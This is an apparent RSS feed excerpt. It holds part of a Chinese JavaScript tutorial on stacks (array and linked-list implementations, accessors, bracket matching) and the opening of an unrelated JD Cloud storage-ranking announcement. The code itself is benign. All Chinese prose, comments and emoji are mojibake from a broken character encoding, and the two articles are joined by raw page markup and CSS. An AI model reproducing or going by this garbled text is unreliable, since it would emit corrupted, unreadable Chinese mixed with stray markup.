<p>æœ‰æ—¶æˆ‘ä»¬å¸Œæœ›æš´éœ²æŸä¸ªå€¼ï¼Œä½†<strong>ç¦æ­¢ä¿®æ”¹</strong>ã€‚è¿™æ—¶å¯ç”¨ <code>get</code> å®šä¹‰è®¿é—®å™¨ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> {
  <span class="hljs-meta">#stack = [];</span>
  <span class="hljs-function">get <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-meta">#stack.length; <span class="hljs-comment">// ğŸ“Š åƒè¯»å±æ€§ä¸€æ ·ä½¿ç”¨</span></span>
  }
}

<span class="hljs-type">const</span> stack = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayStack</span>();
console.<span class="hljs-built_in">log</span>(stack.size); <span class="hljs-comment">// 0</span>
<span class="hljs-comment">// stack.size = 10; // âŒ æ— æ•ˆï¼ˆä¸¥æ ¼æ¨¡å¼æŠ¥é”™ï¼‰</span>
</code></pre>
<p>âœ… <strong>å¥½å¤„</strong>ï¼š</p>
<ul>
<li>è¯­ä¹‰æ¸…æ™°ï¼š<code>size</code> çœ‹ä¼¼å±æ€§ï¼Œå®ä¸ºè®¡ç®—å€¼</li>
<li>å¯åŠ å…¥æ ¡éªŒã€æ—¥å¿—ã€ç¼“å­˜ç­‰é€»è¾‘</li>
<li>å®ç°<strong>åªè¯»æ¥å£</strong>ï¼Œé¿å…è¯¯å†™</li>
</ul>
<p>ğŸ’¡ åŒç†ï¼Œ<code>set</code> å¯æ‹¦æˆªèµ‹å€¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">set</span> <span class="hljs-title function_">maxSize</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'maxSize ä¸èƒ½ä¸ºè´Ÿ'</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_maxSize</span> = value;
}
</code></pre>
<hr/>
<h3 data-id="heading-7">5ï¸âƒ£ æ–¹æ³•å…±äº«äºåŸå‹é“¾ï¼ŒèŠ‚çœå†…å­˜ ğŸ§ </h3>
<p>è¿™æ˜¯ <code>class</code> æœ€é‡è¦çš„æ€§èƒ½ä¼˜åŠ¿ï¼</p>
<p>æ‰€æœ‰å®ä¾‹æ–¹æ³•ï¼ˆéé™æ€ã€éç®­å¤´å‡½æ•°ï¼‰éƒ½å®šä¹‰åœ¨<strong>ç±»çš„åŸå‹</strong>ä¸Šï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span> {
  <span class="hljs-title function_">push</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-title function_">pop</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-keyword">const</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>();
<span class="hljs-keyword">const</span> s2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s1.<span class="hljs-property">push</span> === s2.<span class="hljs-property">push</span>); <span class="hljs-comment">// âœ… trueï¼</span>
</code></pre>
<p>âœ… <strong>è¿™æ„å‘³ç€</strong>ï¼š</p>
<ul>
<li>æ–¹æ³•<strong>åªåœ¨å†…å­˜ä¸­å­˜åœ¨ä¸€ä»½</strong></li>
<li>æ‰€æœ‰å®ä¾‹é€šè¿‡åŸå‹é“¾<strong>å…±äº«</strong>æ–¹æ³•</li>
<li>æå¤§èŠ‚çœå†…å­˜ï¼Œå°¤å…¶é€‚åˆåˆ›å»ºå¤§é‡å¯¹è±¡ï¼ˆå¦‚æ¸¸æˆå®ä½“ã€UI ç»„ä»¶ï¼‰</li>
</ul>
<p>âŒ å¯¹æ¯”åæ¨¡å¼ï¼ˆES5 å¸¸è§é™·é˜±ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">BadStack</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* æ¯æ¬¡ new éƒ½æ–°å»ºå‡½æ•°ï¼*/</span> };
}
</code></pre>
<blockquote>
<p>ğŸ“Œ <strong>å»ºè®®</strong>ï¼šç°ä»£é¡¹ç›®ä¼˜å…ˆä½¿ç”¨ ES6+ <code>class</code>ï¼Œå–„ç”¨ç§æœ‰å­—æ®µä¸è®¿é—®å™¨ï¼Œæ„å»ºé«˜å†…èšã€ä½è€¦åˆçš„ç»„ä»¶ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">å››ã€ä¸¤ç§å®ç°æ–¹å¼ï¼šæ•°ç»„ vs é“¾è¡¨ âš–ï¸</h2>
<p>æ ˆå¯ä»¥ç”¨<strong>æ•°ç»„</strong>æˆ–<strong>é“¾è¡¨</strong>å®ç°ï¼Œå„æœ‰ä¼˜åŠ£ï¼š</p>
<hr/>
<h3 data-id="heading-9">1ï¸âƒ£ åŸºäºæ•°ç»„çš„æ ˆï¼ˆArrayStackï¼‰ğŸ“¦</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> {
  #stack = [];
  <span class="hljs-keyword">get</span> size() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack.length; }
  isEmpty() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.size === <span class="hljs-number">0</span>; }
  push(num) { <span class="hljs-keyword">this</span>.#stack.push(num); }
  pop() {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isEmpty()) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'æ ˆä¸ºç©º'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack.pop();
  }
  peek() {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isEmpty()) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'æ ˆä¸ºç©º'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack[<span class="hljs-keyword">this</span>.size - <span class="hljs-number">1</span>];
  }
  toArray() { <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">this</span>.#stack]; }
}
</code></pre>
<h4 data-id="heading-10">âœ… ä¼˜ç‚¹ï¼š</h4>
<ul>
<li><strong>æ—¶é—´æ•ˆç‡é«˜</strong>ï¼š<code>push</code>/<code>pop</code> åœ¨å°¾éƒ¨æ“ä½œï¼Œå¹³å‡ <strong>O(1)</strong></li>
<li>å†…å­˜è¿ç»­ï¼Œ<strong>ç¼“å­˜å‹å¥½</strong>ï¼ˆCPU æ›´å¿«è®¿é—®ï¼‰</li>
<li>ä»£ç ç®€æ´ï¼ŒJS æ•°ç»„åŸç”Ÿæ”¯æŒ</li>
</ul>
<h4 data-id="heading-11">âŒ ç¼ºç‚¹ï¼š</h4>
<ul>
<li><strong>æ‰©å®¹æˆæœ¬é«˜</strong>ï¼šå®¹é‡ä¸è¶³æ—¶éœ€å¤åˆ¶æ‰€æœ‰å…ƒç´  â†’ <strong>O(n)</strong></li>
<li>å¯èƒ½å­˜åœ¨<strong>ç©ºé—´æµªè´¹</strong>ï¼ˆé¢„åˆ†é…æœªç”¨å®Œï¼‰</li>
</ul>
<blockquote>
<p>ğŸ’¡ å®é™…ä¸­ï¼Œæ‰©å®¹æ˜¯<strong>ä½é¢‘äº‹ä»¶</strong>ï¼Œ<strong>å‡æ‘Šæ—¶é—´å¤æ‚åº¦ä»ä¸º O(1)</strong> ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">2ï¸âƒ£ åŸºäºé“¾è¡¨çš„æ ˆï¼ˆLinkedListStackï¼‰â›“ï¸</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> {
  <span class="hljs-keyword">constructor</span>(<span class="hljs-keyword">val</span>) {
    <span class="hljs-keyword">this</span>.<span class="hljs-keyword">val</span> = <span class="hljs-keyword">val</span>;
    <span class="hljs-keyword">this</span>.next = <span class="hljs-literal">null</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListStack</span> {
  #stackPeek = <span class="hljs-literal">null</span>;
  #size = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">get</span> size() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#size; }
  isEmpty() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.size === <span class="hljs-number">0</span>; }

  push(num) {
    <span class="hljs-keyword">const</span> node = new ListNode(num);
    node.next = <span class="hljs-keyword">this</span>.#stackPeek;
    <span class="hljs-keyword">this</span>.#stackPeek = node;
    <span class="hljs-keyword">this</span>.#size++;
  }

  peek() {
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.#stackPeek) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'æ ˆä¸ºç©º'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stackPeek.<span class="hljs-keyword">val</span>;
  }

  pop() {
    <span class="hljs-keyword">const</span> num = <span class="hljs-keyword">this</span>.peek();
    <span class="hljs-keyword">this</span>.#stackPeek = <span class="hljs-keyword">this</span>.#stackPeek.next;
    <span class="hljs-keyword">this</span>.#size--;
    <span class="hljs-keyword">return</span> num;
  }

  toArray() {
    <span class="hljs-keyword">const</span> arr = new Array(<span class="hljs-keyword">this</span>.size);
    let node = <span class="hljs-keyword">this</span>.#stackPeek;
    let i = <span class="hljs-keyword">this</span>.size - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span> (node) {
      arr[i--] = node.<span class="hljs-keyword">val</span>;
      node = node.next;
    }
    <span class="hljs-keyword">return</span> arr;
  }
}
</code></pre>
<h4 data-id="heading-13">âœ… ä¼˜ç‚¹ï¼š</h4>
<ul>
<li><strong>åŠ¨æ€æ‰©å®¹</strong>ï¼šæ¯æ¬¡æ’å…¥åªéœ€ <strong>O(1)</strong> ï¼Œæ— å¤åˆ¶å¼€é”€</li>
<li>ç©ºé—´æŒ‰éœ€åˆ†é…ï¼Œ<strong>æ— æµªè´¹</strong></li>
</ul>
<h4 data-id="heading-14">âŒ ç¼ºç‚¹ï¼š</h4>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹éœ€é¢å¤–å­˜å‚¨ <code>next</code> æŒ‡é’ˆ â†’ <strong>å†…å­˜å¼€é”€æ›´å¤§</strong></li>
<li>èŠ‚ç‚¹åœ¨å†…å­˜ä¸­<strong>ç¦»æ•£åˆ†å¸ƒ</strong> â†’ ç¼“å­˜å±€éƒ¨æ€§å·®</li>
<li>å®ä¾‹åŒ– <code>ListNode</code> æœ‰ä¸€å®šæ€§èƒ½æŸè€—</li>
</ul>
<blockquote>
<p>âœ… <strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>ğŸš€ æ—¥å¸¸å¼€å‘ã€è½»é‡åœºæ™¯ â†’ <strong>æ•°ç»„å®ç°</strong></li>
<li>ğŸ—ï¸ å¤§æ•°æ®ã€ç¨³å®šæ€§è¦æ±‚é«˜ â†’ <strong>é“¾è¡¨å®ç°</strong></li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-15">äº”ã€å®æˆ˜åº”ç”¨ï¼šæœ‰æ•ˆçš„æ‹¬å·åŒ¹é… âœ…</h2>
<p>æ ˆçš„ç»å…¸åº”ç”¨åœºæ™¯ä¹‹ä¸€ï¼</p>
<h3 data-id="heading-16">ğŸ“Œ é—®é¢˜æè¿°ï¼š</h3>
<p>ç»™å®šå­—ç¬¦ä¸² <code>s</code>ï¼Œä»…å« <code>'('</code>, <code>')'</code>, <code>'['</code>, <code>']'</code>, <code>'{'</code>, <code>'}'</code>ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ•ˆï¼š</p>
<ul>
<li>å·¦å³æ‹¬å·å¿…é¡»æ­£ç¡®é—­åˆ</li>
<li>é¡ºåºå¿…é¡»åŒ¹é…ï¼ˆå¦‚ <code>"([)]"</code> âŒ æ— æ•ˆï¼‰</li>
</ul>
<h3 data-id="heading-17">ğŸ§  è§£é¢˜æ€è·¯ï¼š</h3>
<ol>
<li>é‡åˆ°<strong>å·¦æ‹¬å·</strong> â†’ å°†å…¶å¯¹åº”çš„<strong>å³æ‹¬å·</strong>å‹å…¥æ ˆ</li>
<li>é‡åˆ°<strong>å³æ‹¬å·</strong> â†’ æ£€æŸ¥æ˜¯å¦ä¸æ ˆé¡¶åŒ¹é…</li>
<li>éå†ç»“æŸ â†’ æ ˆå¿…é¡»ä¸ºç©º</li>
</ol>
<h3 data-id="heading-18">ğŸ’» ä»£ç å®ç°ï¼š</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> leftToRight = {
  <span class="hljs-string">"("</span>: <span class="hljs-string">")"</span>,
  <span class="hljs-string">"["</span>: <span class="hljs-string">"]"</span>,
  <span class="hljs-string">"{"</span>: <span class="hljs-string">"}"</span>,
};

<span class="hljs-function">function <span class="hljs-title">isValid</span><span class="hljs-params">(s)</span> </span>{
  <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (let ch of s) {
    <span class="hljs-keyword">if</span> (ch in leftToRight) {
      stack.<span class="hljs-built_in">push</span>(leftToRight[ch]); <span class="hljs-comment">// å‹å…¥æœŸæœ›çš„å³æ‹¬å·</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">if</span> (!stack.length || stack.<span class="hljs-built_in">pop</span>() !== ch) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// ä¸åŒ¹é…æˆ–æ ˆç©º</span>
      }
    }
  }
  <span class="hljs-keyword">return</span> stack.length === <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ˆç©ºåˆ™æœ‰æ•ˆ</span>
}
</code></pre>
<p>ğŸ§ª <strong>æµ‹è¯•</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"()"</span>));       <span class="hljs-comment">// âœ… true</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"()[]{}"</span>));   <span class="hljs-comment">// âœ… true</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"(]"</span>));       <span class="hljs-comment">// âŒ false</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"([)]"</span>));     <span class="hljs-comment">// âŒ false</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"{[]}"</span>));     <span class="hljs-comment">// âœ… true</span>
</code></pre>
<blockquote>
<p>ğŸ” <strong>ä¸ºä»€ä¹ˆå‹å…¥â€œå³æ‹¬å·â€ï¼Ÿ</strong><br/>
è¿™æ ·é‡åˆ°å³æ‹¬å·æ—¶å¯ç›´æ¥æ¯”è¾ƒ <code>stack.pop() === ch</code>ï¼Œ<strong>æ— éœ€äºŒæ¬¡æŸ¥è¡¨</strong>ï¼Œé€»è¾‘æ›´ç®€æ´é«˜æ•ˆï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-19">å…­ã€æ€»ç»“å¯¹æ¯” ğŸ“Š</h2>



































<table><thead><tr><th>ç»´åº¦</th><th>æ•°ç»„æ ˆ ğŸ“¦</th><th>é“¾è¡¨æ ˆ â›“ï¸</th></tr></thead><tbody><tr><td>æ—¶é—´å¤æ‚åº¦ï¼ˆå¹³å‡ï¼‰</td><td>O(1)</td><td>O(1)</td></tr><tr><td>æ‰©å®¹å¼€é”€</td><td>O(n)ï¼ˆä½é¢‘ï¼‰</td><td>O(1)</td></tr><tr><td>ç©ºé—´æ•ˆç‡</td><td>å¯èƒ½æµªè´¹</td><td>æŒ‡é’ˆå¼€é”€ï¼ˆçº¦ +50%ï¼‰</td></tr><tr><td>å®ç°éš¾åº¦</td><td>â­ ç®€å•</td><td>â­â­ ä¸­ç­‰</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>é€šç”¨ã€è½»é‡çº§</td><td>å¤§æ•°æ®ã€ç¨³å®šæ€§è¦æ±‚é«˜</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-20">ğŸ¯ ç»“è¯­</h2>
<p>æ ˆè™½ç®€å•ï¼Œå´æ˜¯ç†è§£ç¨‹åºè¿è¡Œæœºåˆ¶ï¼ˆå¦‚è°ƒç”¨æ ˆï¼‰å’Œè§£å†³ç®—æ³•é—®é¢˜ï¼ˆDFSã€è¡¨è¾¾å¼è§£æã€å›æº¯ï¼‰çš„<strong>åŸºçŸ³æ•°æ®ç»“æ„</strong>ã€‚</p>
<p>æŒæ¡å…¶ä¸¤ç§å®ç°æ–¹å¼åŠå…¸å‹åº”ç”¨ï¼Œä¸ä»…èƒ½å†™å‡ºæ›´é«˜æ•ˆçš„ä»£ç ï¼Œè¿˜èƒ½åœ¨é¢è¯•ä¸­å±•ç°æ‰å®çš„åŸºæœ¬åŠŸï¼</p>
<blockquote>
<p>ğŸ“Œ <strong>ç»ˆæå»ºè®®</strong>ï¼š</p>
<ul>
<li>æ—¥å¸¸å¼€å‘ â†’ ä¼˜å…ˆç”¨ <strong>æ•°ç»„å®ç°</strong>ï¼ˆç®€å•é«˜æ•ˆï¼‰</li>
<li>é¢è¯•/æ€§èƒ½æ•æ„Ÿåœºæ™¯ â†’ ä¸»åŠ¨è®¨è®º <strong>é“¾è¡¨æ–¹æ¡ˆ</strong>ï¼Œå±•ç°æ·±åº¦æ€è€ƒ ğŸ’¡</li>
</ul>
</blockquote>
<hr/>
<p>ğŸ“š <strong>å»¶ä¼¸æ€è€ƒ</strong>ï¼šä½ èƒ½ç”¨æ ˆå®ç°â€œæµè§ˆå™¨åé€€â€åŠŸèƒ½å—ï¼Ÿæˆ–è€…ç”¨ä¸¤ä¸ªæ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Ÿæ¬¢è¿åŠ¨æ‰‹å°è¯•ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨çƒå‰å››ï¼äº¬ä¸œäº‘äº‘æµ·AIå­˜å‚¨è·»èº«IO500é«˜æ€§èƒ½å­˜å‚¨æ¦œå•]]></title>    <link>https://juejin.cn/post/7576955345379082303</link>    <guid>https://juejin.cn/post/7576955345379082303</guid>    <pubDate>2025-11-27T06:40:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379082303" data-draft-id="7577042851079864363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨çƒå‰å››ï¼äº¬ä¸œäº‘äº‘æµ·AIå­˜å‚¨è·»èº«IO500é«˜æ€§èƒ½å­˜å‚¨æ¦œå•"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-27T06:40:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨çƒå‰å››ï¼äº¬ä¸œäº‘äº‘æµ·AIå­˜å‚¨è·»èº«IO500é«˜æ€§èƒ½å­˜å‚¨æ¦œå•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:40:05.000Z" title="Thu Nov 27 2025 06:40:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥ï¼Œåœ¨æœ€æ–°å…¬å¸ƒçš„ IO500 æ’è¡Œæ¦œä¸­ï¼Œäº¬ä¸œäº‘äº‘æµ· AI å­˜å‚¨åŸºäºé€šç”¨ NVMe ç›˜å­˜å‚¨æœåŠ¡å™¨ï¼Œç»“åˆå…¨æ ˆè‡ªç ”è½¯ä»¶ä½“ç³»ä¸æ·±åº¦è°ƒä¼˜ï¼ŒæˆåŠŸè·»èº« IO500 ç”Ÿäº§æ¦œå•å…¨çƒå‰å››ã€å›½äº§è‡ªç ”ç¬¬ä¸€ã€‚ç›¸è¾ƒä¼ ç»Ÿè¶…ç®—å­˜å‚¨æŠ€æœ¯ï¼Œäº‘æµ·AIå­˜å‚¨ä¸é‡‡ç”¨ PMEM ç¡¬ä»¶ï¼Œå…·å¤‡æ›´å¼ºé€šç”¨æ€§çš„åŒæ—¶ä¹Ÿå®ç°äº†æ›´ä½å­˜å‚¨æˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c0739b56f604679adad9e5ef8d86fe7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830405&amp;x-signature=p27tbLiZtFF3O5%2Fq7WbPzPg4H%2Bs%3D" alt="å›¾ç‰‡.png" loading="lazy"/></p>
